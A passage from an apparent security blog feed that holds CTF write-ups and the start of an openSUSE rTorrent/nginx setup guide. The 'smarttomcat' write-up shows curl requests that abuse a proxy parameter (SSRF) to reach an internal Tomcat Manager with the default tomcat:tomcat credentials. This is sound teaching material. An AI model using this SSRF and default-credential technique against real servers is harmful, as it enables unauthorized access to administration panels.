<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/ruby</span></div><div class="line"></div><div class="line"><span class="keyword">require</span> <span class="string">'socket'</span></div><div class="line"><span class="keyword">require</span> <span class="string">'wikidata'</span></div><div class="line"></div><div class="line">hostname = <span class="string">'quizz.teaser.insomnihack.ch'</span></div><div class="line">port = <span class="number">1031</span></div><div class="line"></div><div class="line">s = TCPSocket.open(hostname, port)</div><div class="line">raw = <span class="string">''</span></div><div class="line">flag = <span class="literal">false</span></div><div class="line">find = <span class="literal">false</span></div><div class="line"></div><div class="line"><span class="keyword">while</span> line = s.gets   <span class="comment"># Read lines from the socket</span></div><div class="line">    puts line.chop    <span class="comment"># And print with platform line terminator</span></div><div class="line">    raw += line</div><div class="line">    <span class="keyword">if</span> raw.match(<span class="regexp">/~~ What/</span>) &amp;&amp; flag == <span class="literal">false</span></div><div class="line">        name = raw.match(<span class="regexp">/^~~ What is the birth year of ([a-zA-Z\s\-\.]*) ?/</span>).captures[<span class="number">0</span>]</div><div class="line">        name = name[<span class="number">0</span>...-<span class="number">1</span>]</div><div class="line">        search = Wikidata::Item.search <span class="string">"<span class="subst">#&#123;name&#125;</span>"</span></div><div class="line">        <span class="keyword">if</span> search.empty? == <span class="literal">false</span></div><div class="line">            <span class="keyword">while</span> find == <span class="literal">false</span></div><div class="line">                man = search.results.first</div><div class="line">                <span class="comment">#occupation = man.properties('P106').to_s</span></div><div class="line">                <span class="comment">#if occupation.match(/crypto/) || occupation.match(/computer/)</span></div><div class="line">                <span class="keyword">if</span> <span class="literal">true</span> <span class="comment"># homonym avoidance take to much time</span></div><div class="line">                    birth_year = man.date_of_birth.date.year</div><div class="line">                    puts <span class="string">"<span class="subst">#&#123;name&#125;</span>: <span class="subst">#&#123;birth_year&#125;</span>"</span></div><div class="line">                    s.puts birth_year</div><div class="line">                    raw = <span class="string">''</span></div><div class="line">                    find = <span class="literal">true</span></div><div class="line">                <span class="keyword">else</span></div><div class="line">                    puts <span class="string">"shift"</span></div><div class="line">                    search.results.shift    <span class="comment"># remove first item of the array</span></div><div class="line">                <span class="keyword">end</span></div><div class="line">            <span class="keyword">end</span></div><div class="line">            find = <span class="literal">false</span>    <span class="comment"># for the next search</span></div><div class="line">        <span class="keyword">end</span></div><div class="line">    <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div><div class="line">s.close               <span class="comment"># Close the socket when done</span></div></pre></td></tr></table></figure></p>
<p>Here is the output of the script:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]–––––––––––––––––––––––––––––––––––[~/CTF/Insomnihack/Teaser/2017]</div><div class="line">$ ruby cryptoquizz.rb</div><div class="line"></div><div class="line">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</div><div class="line">~~ Hello, young hacker. Are you ready to fight rogue machines ?    ~~</div><div class="line">~~ Now, you&apos;ll have to prove us that you are a genuine             ~~</div><div class="line">~~ cryptographer.                                                  ~~</div><div class="line">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</div><div class="line"></div><div class="line"></div><div class="line">~~ What is the birth year of Nigel P. Smart ?</div><div class="line">Nigel P. Smart: 1967</div><div class="line"></div><div class="line"></div><div class="line">~~ What is the birth year of Don Coppersmith ?</div><div class="line">Don Coppersmith: 1950</div><div class="line"></div><div class="line"></div><div class="line">~~ What is the birth year of Niels Ferguson ?</div><div class="line">Niels Ferguson: 1965</div><div class="line"></div><div class="line"></div><div class="line">~~ What is the birth year of Mihir Bellare ?</div><div class="line">Mihir Bellare: 1962</div><div class="line"></div><div class="line"></div><div class="line">~~ What is the birth year of Amos Fiat ?</div><div class="line">Amos Fiat: 1956</div><div class="line"></div><div class="line"></div><div class="line">~~ What is the birth year of Wang Xiaoyun ?</div><div class="line">Wang Xiaoyun: 1966</div><div class="line"></div><div class="line"></div><div class="line">~~ What is the birth year of Eli Biham ?</div><div class="line">Eli Biham: 1960</div><div class="line"></div><div class="line"></div><div class="line">~~ What is the birth year of Martin Hellman ?</div><div class="line">Martin Hellman: 1945</div><div class="line"></div><div class="line"></div><div class="line">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</div><div class="line">~~ OK, young hacker. You are now considered to be a                ~~</div><div class="line">~~ INS&#123;GENUINE_CRYPTOGRAPHER_BUT_NOT_YET_A_PROVEN_SKILLED_ONE&#125;     ~~</div><div class="line">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</div></pre></td></tr></table></figure></p>
<p>Flag was: <code>INS{GENUINE_CRYPTOGRAPHER_BUT_NOT_YET_A_PROVEN_SKILLED_ONE}</code>.</p>
<p><strong>Opinion</strong>: I don't kniw if <em>cryptopathe</em> (challenge's author) did it on purpose to make it harder or did it unintentionally because he/she didn't checked his/her challenge and used a crappy data set, but giving wrong, partial, diminutive, nickname is very problematic for searches. I think this is not a well written challenge.</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;informations&quot;&gt;Informations&lt;/h2&gt;
&lt;h3 id=&quot;version&quot;&gt;Version&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;By&lt;/th&gt;
&lt;th&gt;Version&lt;/th&gt;
&lt;th&gt;Comment&lt;/th&gt;
&lt;/t
    
    </summary>
    
      <category term="security" scheme="https://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="https://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="https://rawsec.ml/tags/security/"/>
    
      <category term="writeups" scheme="https://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="https://rawsec.ml/tags/ctf/"/>
    
      <category term="misc" scheme="https://rawsec.ml/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>Insomni&#39;hack teaser - 50 - smarttomcat - Web</title>
    <link href="https://rawsec.ml/en/Insomnihack-2017-Teaser-smarttomcat/"/>
    <id>https://rawsec.ml/en/Insomnihack-2017-Teaser-smarttomcat/</id>
    <published>2017-01-20T23:00:00.000Z</published>
    <updated>2017-02-07T18:23:36.685Z</updated>
    
    <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
<h3 id="version">Version</h3>
<table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="ctf">CTF</h3>
<ul>
<li><strong>Name</strong> : Insomni'hack teaser 2017</li>
<li><strong>Website</strong> : <a href="http://teaser.insomnihack.ch/" target="_blank" rel="external">teaser.insomnihack.ch</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/382" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="description">Description</h3>
<blockquote>
<p>smarttomcat - Web - 50 pts - realized by xel/grimmlin</p>
<p>Normal, regular cats are so 2000 and late, I decided to buy this allegedly smart tomcat robot
Now the damn thing has attacked me and flew away. I can't even seem to track it down on the broken search interface... Can you help me ?</p>
<p><a href="http://smarttomcat.teaser.insomnihack.ch/" target="_blank" rel="external">Search interface</a></p>
</blockquote>
<h2 id="solution">Solution</h2>
<p>We have a web application like this:</p>
<p><img src="http://i.imgur.com/ey5DMYM.png" alt=""></p>
<p>Let's take a look at sources, there is some JavaScript:</p>
<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line">[...]</div><div class="line">&lt;script&gt;</div><div class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> OpenLayers.Map(<span class="string">"map"</span>);</div><div class="line">map.addLayer(<span class="keyword">new</span> OpenLayers.Layer.OSM());</div><div class="line"><span class="keyword">var</span> lonlat = <span class="keyword">new</span> OpenLayers.LonLat(<span class="number">15.2833</span>,<span class="number">-4.2667</span>).transform(<span class="keyword">new</span> OpenLayers.Projection(<span class="string">"EPSG:4326"</span>),map.getProjectionObject());</div><div class="line"><span class="keyword">var</span> zoom = <span class="number">10</span>;</div><div class="line"><span class="keyword">var</span> markers = <span class="keyword">new</span> OpenLayers.Layer.Markers( <span class="string">"Markers"</span> );</div><div class="line">map.addLayer(markers);</div><div class="line"><span class="keyword">var</span> center_marker = <span class="keyword">new</span> OpenLayers.Marker(lonlat);</div><div class="line">markers.addMarker(center_marker);</div><div class="line">map.setCenter(lonlat,zoom);</div><div class="line"><span class="keyword">var</span> request;</div><div class="line">$(<span class="string">'#findcatbycoord'</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</div><div class="line">    event.preventDefault();</div><div class="line">    <span class="keyword">if</span> (request) &#123;</div><div class="line">        request.abort();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">var</span> cat_coords = <span class="string">'http://localhost:8080/index.jsp?x='</span> + <span class="built_in">parseFloat</span>($(<span class="string">'#xcoord'</span>).val()) + <span class="string">'&amp;y='</span> + <span class="built_in">parseFloat</span>($(<span class="string">'#ycoord'</span>).val());</div><div class="line">    <span class="keyword">var</span> $form = $(<span class="keyword">this</span>);</div><div class="line">    <span class="keyword">var</span> $inputs = $form.find(<span class="string">'input, select, button, textarea'</span>);</div><div class="line">    $inputs.prop(<span class="string">'disabled'</span>, <span class="literal">true</span>);</div><div class="line"></div><div class="line">    request = $.ajax(&#123;</div><div class="line">        url: <span class="string">'/index.php'</span>,</div><div class="line">        type: <span class="string">'post'</span>,</div><div class="line">        success: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</div><div class="line">          markers.clearMarkers();</div><div class="line">          <span class="keyword">while</span>(map.popups.length) &#123;map.removePopup(map.popups[<span class="number">0</span>]);&#125;</div><div class="line">          <span class="keyword">var</span> y = <span class="built_in">parseFloat</span>($(<span class="string">'#ycoord'</span>).val());</div><div class="line">          <span class="keyword">var</span> x = <span class="built_in">parseFloat</span>($(<span class="string">'#xcoord'</span>).val());</div><div class="line">          <span class="keyword">if</span> (<span class="built_in">isNaN</span>(y) || <span class="built_in">isNaN</span>(x)) &#123;y = <span class="number">15.2833</span>; x = <span class="number">-4.2667</span>;&#125;</div><div class="line">          lonlat = <span class="keyword">new</span> OpenLayers.LonLat(y,x).transform(<span class="keyword">new</span> OpenLayers.Projection(<span class="string">"EPSG:4326"</span>),map.getProjectionObject());</div><div class="line">          center_marker = <span class="keyword">new</span> OpenLayers.Marker(lonlat);</div><div class="line">          markers.addMarker(center_marker);</div><div class="line">          popup = <span class="keyword">new</span> OpenLayers.Popup.FramedCloud(<span class="string">"popup"</span>,</div><div class="line">                   lonlat,</div><div class="line">                   <span class="literal">null</span>,</div><div class="line">                   data, <span class="literal">null</span>,</div><div class="line">                   <span class="literal">true</span>);</div><div class="line">          map.addPopup(popup);</div><div class="line">          map.setCenter(lonlat,zoom);</div><div class="line">        &#125;,</div><div class="line">        data: &#123;</div><div class="line">		u: cat_coords</div><div class="line">	&#125;</div><div class="line">    &#125;);</div><div class="line">    request.always(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">       $inputs.prop(<span class="string">'disabled'</span>, <span class="literal">false</span>);</div><div class="line">    &#125;);</div><div class="line"></div><div class="line">&#125;);</div><div class="line"><span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></div><div class="line">[...]</div></pre></td></tr></table></figure></p>
<p>The interesting line is:
<code>var cat_coords = 'http://localhost:8080/index.jsp?x=' + parseFloat($('#xcoord').val()) + '&amp;y=' + parseFloat($('#ycoord').val());</code>. So we have one web serve that is a proxy for a web application.</p>
<p>We can see in http headers that the front-end server is <code>Apache/2.4.18 (Ubuntu)</code>.</p>
<p>The description is suggesting we have a Tomcat web app.</p>
<p>In the javascript we can see <code>var map = new OpenLayers.Map(&quot;map&quot;);</code> and <code>OpenLayers</code> is a class of GeoServer.</p>
<p>What do we have?</p>
<ul>
<li>Front-end: <code>Apache/2.4.18 (Ubuntu)</code></li>
<li>Back-end: <code>Apache Tomcat/7.0.68 (Ubuntu)</code></li>
<li>Map-core: <code>GeoServer</code></li>
</ul>
<p>In the javascript we also see <code>if (isNaN(y) || isNaN(x)) {y = 15.2833; x = -4.2667;}</code> that means the browser won't let us send anything else than numbers in the form. We should use Hackbar or curl.</p>
<p>What to do now? We guessed this is a Tomcat web app so let's find the Tomcat Manager (administration panel for Tomcat web server).</p>
<p>A normal request (POST data) would be:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">u=http://localhost:8080/index.jsp?x=42%26y=1337</div></pre></td></tr></table></figure></p>
<p>With curl:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&amp; curl --data &quot;u=http://localhost:8080/index.jsp?x=42%26y=1337&quot; http://smarttomcat.teaser.insomnihack.ch/</div><div class="line">Tomcat not found ! Try again</div></pre></td></tr></table></figure></p>
<p>Now let's try to reach the Tomcat Manager page which is usually: <code>http://example.org:8180/manager/html</code>. Here we have the manager also running on port <code>8080</code>.</p>
<p>So with curl:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&amp; curl --data &quot;u=http://127.0.0.1:8080/manager/html/&quot; http://smarttomcat.teaser.insomnihack.ch/</div><div class="line">&lt;html&gt;&lt;head&gt;&lt;title&gt;Apache Tomcat/7.0.68 (Ubuntu) - Error report&lt;/title&gt;&lt;style&gt;&lt;!--H1 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;&#125; H2 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;&#125; H3 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;&#125; BODY &#123;font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;&#125; B &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;&#125; P &#123;font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;&#125;A &#123;color : black;&#125;A.name &#123;color : black;&#125;HR &#123;color : #525D76;&#125;--&gt;&lt;/style&gt; &lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 401 - &lt;/h1&gt;&lt;HR size=&quot;1&quot; noshade=&quot;noshade&quot;&gt;&lt;p&gt;&lt;b&gt;type&lt;/b&gt; Status report&lt;/p&gt;&lt;p&gt;&lt;b&gt;message&lt;/b&gt; &lt;u&gt;&lt;/u&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;description&lt;/b&gt; &lt;u&gt;This request requires HTTP authentication.&lt;/u&gt;&lt;/p&gt;&lt;HR size=&quot;1&quot; noshade=&quot;noshade&quot;&gt;&lt;h3&gt;Apache Tomcat/7.0.68 (Ubuntu)&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;%</div></pre></td></tr></table></figure></p>
<p>With hackbar:</p>
<p><img src="http://i.imgur.com/q3IC28Y.png" alt=""></p>
<p>We can see the following error: <code>HTTP Status 401: This request requires HTTP authentication.</code>
This is because we should provide some Basic Auth informations.</p>
<p>Default credentials of Tomcat Manager are <code>tomcat:tomcat</code>.</p>
<p>So the http header for authentification should be <code>Authorization: Basic dG9tY2F0OnRvbWNhdA==</code>.</p>
<p>The option to pass basic authentification to curl is <code>-u</code> but doing the following command won't work:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ curl -u tomcat:tomcat --data &quot;u=http://127.0.0.1:8080/manager/html/&quot; http://smarttomcat.teaser.insomnihack.ch/</div></pre></td></tr></table></figure></p>
<p>Because this will provide the authentification to the Apache front-end instead of giving it to the proxyfied Tomcat Manager running on the back-end.</p>
<p>But it's possible to directly provide credentials for basic autentification in the URL, for example: <code>http://user:pass@example.org</code>.</p>
<p>Let's do it:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ curl --data &quot;u=http://tomcat:tomcat@127.0.0.1:8080/manager/html/&quot; http://smarttomcat.teaser.insomnihack.ch/</div><div class="line">We won&apos;t give you the manager, but you can have the flag : INS&#123;th1s_is_re4l_w0rld_pent3st&#125;</div></pre></td></tr></table></figure></p>
<p>The flag was: <code>INS{th1s_is_re4l_w0rld_pent3st}</code>. No need to find the coordinates.</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;informations&quot;&gt;Informations&lt;/h2&gt;
&lt;h3 id=&quot;version&quot;&gt;Version&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;By&lt;/th&gt;
&lt;th&gt;Version&lt;/th&gt;
&lt;th&gt;Comment&lt;/th&gt;
&lt;/t
    
    </summary>
    
      <category term="security" scheme="https://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="https://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="https://rawsec.ml/tags/security/"/>
    
      <category term="web" scheme="https://rawsec.ml/tags/web/"/>
    
      <category term="writeups" scheme="https://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="https://rawsec.ml/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>OpenSUSE : Install rTorrent and ruTorrent</title>
    <link href="https://rawsec.ml/en/opensuse-install-rtorrent-rutorrent/"/>
    <id>https://rawsec.ml/en/opensuse-install-rtorrent-rutorrent/</id>
    <published>2016-12-29T23:00:00.000Z</published>
    <updated>2017-02-07T18:23:36.855Z</updated>
    
    <content type="html"><![CDATA[<ul>
<li>Install rTorrent, git ang nginx:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># zypper install rtorrent git nginx</div></pre></td></tr></table></figure></p>
<p><strong>Warning</strong>: rtorrent package in official openSUSE repository is not compiled with xmlrpc so you won't be able to use it with rutorrent.</p>
<ul>
<li>Add the php devel repository to be able to install php7:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># zypper addrepo http://download.opensuse.org/repositories/devel:languages:php/openSUSE_Leap_42.1/devel:languages:php.repo</div><div class="line"># zypper refresh</div><div class="line"># zypper install php7 php7-fpm</div></pre></td></tr></table></figure></p>
<ul>
<li>Go to the default web folder and clone the <a href="https://github.com/Novik/ruTorrent" target="_blank" rel="external">ruTorrent</a> git repository:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ cd /srv/www/htdocs/</div><div class="line"># git clone https://github.com/Novik/ruTorrent.git rutorrent</div></pre></td></tr></table></figure></p>
<ul>
<li>Enable and start nginx:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># systemctl enable nginx.service</div><div class="line"># systemctl start nginx.service</div></pre></td></tr></table></figure></p>
<ul>
<li>Open php configuration:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># vim /etc/php7/cli/php.ini</div></pre></td></tr></table></figure></p>
<ul>
<li>Disable php exposure (<a href="http://php.net/manual/en/ini.core.php#ini.expose-php" target="_blank" rel="external">expose_php</a>):</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">expose_php = Off</div></pre></td></tr></table></figure></p>
<ul>
<li>Enable file uploads (<a href="http://php.net/manual/en/ini.core.php#ini.file-uploads" target="_blank" rel="external">file_uploads</a>):</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">file_uploads = On</div></pre></td></tr></table></figure></p>
<ul>
<li>Set the maximum size of an uploaded file (<a href="http://php.net/manual/en/ini.core.php#ini.upload-max-filesize" target="_blank" rel="external">upload_max_filesize</a>):</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">upload_max_filesize = 15M</div></pre></td></tr></table></figure></p>
<ul>
<li>Set max size of post data allowed (<a href="http://php.net/manual/en/ini.core.php#ini.post-max-size" target="_blank" rel="external">post_max_size</a>):</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">post_max_size = 15M</div></pre></td></tr></table></figure></p>
<ul>
<li>Set the timezone (<a href="http://php.net/manual/en/datetime.configuration.php#ini.date.timezone" target="_blank" rel="external">date.timezone</a>).</li>
<li>For more security, limit the files that can be accessed by php (<a href="http://php.net/manual/en/ini.core.php#ini.open-basedir" target="_blank" rel="external">open_basedir</a>):</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">open_basedir = /srv/www/htdocs/rutorrent</div></pre></td></tr></table></figure></p>
<ul>
<li>Change the value of cgi.fix_pathinfo to zero for security reasons:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cgi.fix_pathinfo=0</div></pre></td></tr></table></figure></p>
<ul>
<li>Save and quit <code>php.ini</code>.</li>
<li>Create the <code>php-fpm.conf</code> and <code>www.conf</code> files:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># cp /etc/php7/fpm/php-fpm.conf.default /etc/php7/fpm/php-fpm.conf</div><div class="line"># cp /etc/php7/fpm/php-fpm.d/www.conf.default /etc/php7/fpm/php-fpm.d/www.conf</div></pre></td></tr></table></figure></p>
<ul>
<li>Edit the php-fpm configuration:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># vim /etc/php7/fpm/php-fpm.conf</div></pre></td></tr></table></figure></p>
<ul>
<li>To enable php-fpm log, uncomment this line (the default prefix is <code>/var</code>):</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">error_log = log/php-fpm.log</div></pre></td></tr></table></figure></p>
<ul>
<li>Edit the php-fpm pool file:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># vim /etc/php7/fpm/php-fpm.d/www.conf</div></pre></td></tr></table></figure></p>
<ul>
<li>Configure the owner of the nginx process to the Nginx user:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">user = nginx</div><div class="line">group = nginx</div></pre></td></tr></table></figure></p>
<ul>
<li>Configure php-fpm to run under a socket file, not a port:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">listen = /var/run/php-fpm.sock</div></pre></td></tr></table></figure></p>
<ul>
<li>Change the permissions for the unix socket to the nginx user, group and mode:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">listen.owner = nginx</div><div class="line">listen.group = nginx</div><div class="line">listen.mode = 0660</div></pre></td></tr></table></figure></p>
<ul>
<li>Enable and start php-fpm:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># systemctl enable php-fpm</div><div class="line"># systemctl start php-fpm</div></pre></td></tr></table></figure></p>
<ul>
<li>Create an authentification folder for nginx:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># mkdir /etc/nginx/auth</div></pre></td></tr></table></figure></p>
<ul>
<li>Create the virtual servers directories:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># mkdir /etc/nginx/servers-available</div><div class="line"># mkdir /etc/nginx/servers-enabled</div></pre></td></tr></table></figure></p>
<ul>
<li>Edit the nginx configuration file:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># vim /etc/nginx/nginx.conf</div></pre></td></tr></table></figure></p>
<ul>
<li>And add this config:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line">user nginx;</div><div class="line">worker_processes auto;</div><div class="line">pid /var/run/nginx.pid;</div><div class="line"></div><div class="line">events &#123;</div><div class="line">    worker_connections 1024;</div><div class="line">    multi_accept on;</div><div class="line">    use epoll;</div><div class="line">&#125;</div><div class="line"></div><div class="line">http &#123;</div><div class="line"></div><div class="line">    charset UTF-8;</div><div class="line"></div><div class="line">    ##</div><div class="line">    # Basic Settings</div><div class="line">    ##</div><div class="line">    server_names_hash_bucket_size 64;</div><div class="line">    sendfile on;</div><div class="line">    tcp_nopush on;</div><div class="line">    tcp_nodelay on;</div><div class="line">    keepalive_timeout 65;</div><div class="line">    types_hash_max_size 2048;</div><div class="line">    server_tokens off;</div><div class="line"></div><div class="line">    # server_name_in_redirect off;</div><div class="line"></div><div class="line">    include /etc/nginx/mime.types;</div><div class="line">    default_type application/octet-stream;</div><div class="line"></div><div class="line">    ##</div><div class="line">    # Logging Settings</div><div class="line">    ##</div><div class="line">    access_log 